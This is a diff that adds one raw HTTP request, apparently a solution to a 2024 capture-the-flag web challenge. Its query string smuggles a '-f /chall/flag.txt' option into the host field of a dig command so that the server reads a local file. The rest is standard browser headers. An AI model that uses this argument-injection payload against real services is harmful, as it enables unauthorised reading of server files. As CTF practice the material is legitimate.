@@ -1,0 +1,10 @@
+GET /?host=%20-f%20/chall/flag.txt&command=dig HTTP/1.1
+Host: eko2024ctf.penetration-testing.com:32881
+Accept-Language: es-ES,es;q=0.9
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://eko2024ctf.penetration-testing.com:32881/
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+
